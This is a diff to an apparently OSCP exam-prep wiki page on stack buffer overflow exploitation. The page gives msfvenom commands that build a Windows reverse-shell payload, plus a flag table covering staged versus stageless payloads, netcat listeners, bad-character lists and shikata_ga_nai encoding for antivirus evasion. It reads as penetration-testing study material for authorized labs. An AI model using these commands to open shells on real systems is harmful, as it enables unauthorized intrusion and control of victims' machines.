@@ -8,19 +8,19 @@ Part of [[COMMAND APPENDIX]]. Stack-based buffer overflow exploitation: shellcod
 
 ```bash
 # Embed directly into a C source file's byte array (classic/EIP-style exploit)
-msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread \
+msfvenom -p windows/shell_reverse_tcp LHOST=$BoxIP LPORT=$Port EXITFUNC=thread \
   -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 
 # Generate as raw bytes to a file instead of hand-transcribing a giant escaped string
 # into a script (safer, avoids transcription errors on long payloads)
-msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread \
+msfvenom -p windows/shell_reverse_tcp LHOST=$BoxIP LPORT=$Port EXITFUNC=thread \
   -f raw -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20\x25\x26\x2b\x3d" -o shell.bin
 ```
 | Flag | What it does |
 |---|---|
 | `-p windows/shell_reverse_tcp` | **stageless** payload, self-contained, a plain `nc -lvnp` listener catches it directly |
 | `-p windows/meterpreter/reverse_tcp` | **staged** payload, needs a matching `multi/handler` (same payload/LHOST/LPORT) to catch it, not a plain listener |
-| `-f c` / `-f python` / `-f raw` | output format: ready-to-paste C byte array, Python string, or raw bytes (pair `-f raw` with `-o <file>` and read the file from the exploit script instead of embedding it inline) |
+| `-f c` / `-f python` / `-f raw` | output format: ready-to-paste C byte array, Python string, or raw bytes (pair `-f raw` with `-o $BoxDir` and read the file from the exploit script instead of embedding it inline) |
 | `-b "\x00..."` | bad characters to avoid entirely in the encoded output, always includes `\x00` (null terminator) at minimum, add more based on how the payload is delivered (e.g. `\x20`/space and `\x0a\x0d`/CRLF and `\x25\x26\x2b\x3d`/URL-special chars if it rides inside an HTTP request) |
 | `-e x86/shikata_ga_nai` | polymorphic encoder, both dodges bad characters and does basic AV evasion |
 | `EXITFUNC=thread` | how the payload's process should exit when done, `thread` kills only the spawned thread rather than the whole target process |
@@ -71,3 +71,14 @@ This area grows alongside the module. A genuine from-scratch offset/bad-char/ret
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
